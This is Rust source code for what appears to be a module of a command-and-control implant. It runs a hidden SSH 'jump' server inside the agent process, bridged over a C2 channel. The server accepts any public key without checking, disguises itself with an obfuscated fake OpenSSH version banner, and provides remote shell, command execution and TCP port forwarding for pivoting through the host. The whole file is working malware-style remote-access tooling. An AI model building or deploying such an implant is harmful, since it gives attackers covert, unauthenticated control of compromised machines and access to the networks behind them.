use russh::server::{self, Auth, Msg, Session};
use russh::{Channel, ChannelId, ChannelWriteHalf};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;

/// Session state for one operator channel inside the jump server,
/// or a session channel on the control connection.
pub struct SessionCtx<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static = Msg> {
    pub writer: Arc<ChannelWriteHalf<S>>,
    pub pty: std::sync::Mutex<Option<Arc<super::sx::PtyState>>>,
    pub stdin_tx: tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
    pub stdin_rx: tokio::sync::Mutex<Option<tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>>>,
}

impl<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static> SessionCtx<S> {
    pub async fn take_stdin(&self) -> Option<tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>> {
        self.stdin_rx.lock().await.take()
    }
}

#[derive(Clone, Default)]
pub struct JumpServerHandler {
    pub sessions: Arc<Mutex<HashMap<ChannelId, Arc<SessionCtx>>>>,
}

/// Serve the "jump" channel: run an SSH server inside the agent process
/// bridged over the channel, mirroring the Go client's JumpHandler.
pub async fn serve(channel: Channel<russh::client::Msg>, key: Arc<russh::keys::PrivateKey>) {
    let channel_stream = channel.into_stream();
    let (client_side, server_side) = tokio::io::duplex(64 * 1024);

    // Bridge the C2 channel and the in-memory pipe the SSH server runs on.
    let bridge = tokio::spawn(async move {
        let mut stream = channel_stream;
        let mut client_side = client_side;
        let _ = tokio::io::copy_bidirectional(&mut stream, &mut client_side).await;
    });

    let config = Arc::new(server::Config {
        keys: vec![(*key).clone()],
        inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
        auth_rejection_time: std::time::Duration::from_secs(0),
        server_id: russh::SshId::Standard(crate::ob!("SSH-2.0-OpenSSH_9.6").into()),
        ..Default::default()
    });

    let handler = JumpServerHandler::default();

    if let Ok(running) = server::run_stream(config, server_side, handler).await {
        let _ = running.await;
    }
    bridge.abort();
}

impl server::Server for JumpServerHandler {
    type Handler = JumpServerHandler;
    fn new_client(&mut self, _peer: Option<std::net::SocketAddr>) -> Self::Handler {
        self.clone()
    }
}

impl server::Handler for JumpServerHandler {
    type Error = russh::Error;

    async fn auth_publickey(
        &mut self,
        _user: &str,
        _key: &russh::keys::PublicKey,
    ) -> Result<Auth, Self::Error> {
        Ok(Auth::Accept)
    }

    async fn channel_open_session(
        &mut self,
        channel: Channel<Msg>,
        reply: server::ChannelOpenHandle,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        reply.accept().await;
        let (reader, writer) = channel.split();
        drop(reader); // data arrives via typed handler callbacks
        let (stdin_tx, stdin_rx) = tokio::sync::mpsc::unbounded_channel();
        let ctx = Arc::new(SessionCtx {
            writer: Arc::new(writer),
            pty: std::sync::Mutex::new(None),
            stdin_tx,
            stdin_rx: tokio::sync::Mutex::new(Some(stdin_rx)),
        });
        self.sessions.lock().await.insert(ctx.writer.id(), ctx);
        Ok(())
    }

    async fn data(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        let sessions = self.sessions.lock().await;
        if let Some(ctx) = sessions.get(&channel) {
            let _ = ctx.stdin_tx.send(data.to_vec());
        }
        Ok(())
    }

    async fn pty_request(
        &mut self,
        channel: ChannelId,
        term: &str,
        col_width: u32,
        row_height: u32,
        pix_width: u32,
        pix_height: u32,
        modes: &[(russh::Pty, u32)],
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        let _ = (term, pix_width, pix_height, modes);
        let sessions = self.sessions.lock().await;
        if let Some(ctx) = sessions.get(&channel) {
            let pty = super::sx::PtyState::new(col_width, row_height);
            *ctx.pty.lock().unwrap() = Some(Arc::new(pty));
        }
        session.channel_success(channel)?;
        Ok(())
    }

    async fn shell_request(
        &mut self,
        channel: ChannelId,
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        let Some(ctx) = self.sessions.lock().await.get(&channel).cloned() else {
            return Ok(());
        };
        session.channel_success(channel)?;
        tokio::spawn(async move {
            super::sx::run_shell(ctx).await;
        });
        Ok(())
    }

    async fn exec_request(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        let Some(ctx) = self.sessions.lock().await.get(&channel).cloned() else {
            return Ok(());
        };
        session.channel_success(channel)?;
        let command = String::from_utf8_lossy(data).to_string();
        tokio::spawn(async move {
            super::sx::run_exec(ctx, command).await;
        });
        Ok(())
    }

    async fn subsystem_request(
        &mut self,
        channel: ChannelId,
        name: &str,
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        let Some(ctx) = self.sessions.lock().await.get(&channel).cloned() else {
            return Ok(());
        };
        session.channel_success(channel)?;
        let name = name.to_string();
        tokio::spawn(async move {
            super::sx::run_subsystem(ctx, name).await;
        });
        Ok(())
    }

    async fn window_change_request(
        &mut self,
        channel: ChannelId,
        col_width: u32,
        row_height: u32,
        pix_width: u32,
        pix_height: u32,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        let _ = (pix_width, pix_height);
        let sessions = self.sessions.lock().await;
        if let Some(ctx) = sessions.get(&channel) {
            if let Some(p) = ctx.pty.lock().unwrap().as_ref() {
                p.resize(col_width, row_height);
            }
        }
        Ok(())
    }

    async fn channel_eof(
        &mut self,
        channel: ChannelId,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        let sessions = self.sessions.lock().await;
        if let Some(ctx) = sessions.get(&channel) {
            let _ = ctx.stdin_tx.send(Vec::new());
        }
        Ok(())
    }

    async fn channel_close(
        &mut self,
        channel: ChannelId,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        self.sessions.lock().await.remove(&channel);
        Ok(())
    }

    async fn channel_open_direct_tcpip(
        &mut self,
        channel: Channel<Msg>,
        host_to_connect: &str,
        port_to_connect: u32,
        _originator_address: &str,
        _originator_port: u32,
        reply: server::ChannelOpenHandle,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        reply.accept().await;
        let host = host_to_connect.to_string();
        tokio::spawn(async move {
            super::fw::direct_tcpip(channel, host, port_to_connect).await;
        });
        Ok(())
    }

    async fn tcpip_forward(
        &mut self,
        address: &str,
        port: &mut u32,
        session: &mut Session,
    ) -> Result<bool, Self::Error> {
        let addr = address.to_string();
        let mut listen_port = *port;
        match super::fw::start_remote_forward(session.handle(), addr, &mut listen_port).await {
            Ok(()) => {
                *port = listen_port;
                Ok(true)
            }
            Err(_) => Ok(false),
        }
    }

    async fn cancel_tcpip_forward(
        &mut self,
        address: &str,
        port: u32,
        _session: &mut Session,
    ) -> Result<bool, Self::Error> {
        super::fw::stop_remote_forward(address, port);
        Ok(true)
    }
}
